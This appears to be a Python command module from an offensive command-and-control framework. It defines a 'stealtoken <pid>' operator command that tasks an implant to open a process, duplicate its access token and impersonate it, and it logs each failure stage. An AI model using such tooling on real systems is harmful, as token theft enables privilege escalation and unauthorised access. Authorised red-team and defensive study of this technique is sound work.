from core.state import send_task
from core.state import TaskCode
from core import logging

def finish_stealtoken(response, cache):
    if response.success:
        logging.success("Captured token")
    else:
        if response.return_code == 50:
            logging.error("Failed to open process")
        elif response.return_code == 51:
            logging.error("Failed to open process token")
        elif response.return_code == 52:
            logging.error("Failed to duplicate token")
        elif response.return_code == 53:
            logging.error("Failed to impersonate token")
        else:
            logging.error("Failed to steal token")

def do_stealtoken(self, command):
    """
    Captures token from remote process and impersonates

    Syntax:
        stealtoken <pid>
    """
    
    try: 
        int(command)
    except ValueError:
        logging.print(self.do_stealtoken.__doc__)
        return
        
    send_task(TaskCode.StealToken, argument1 = command)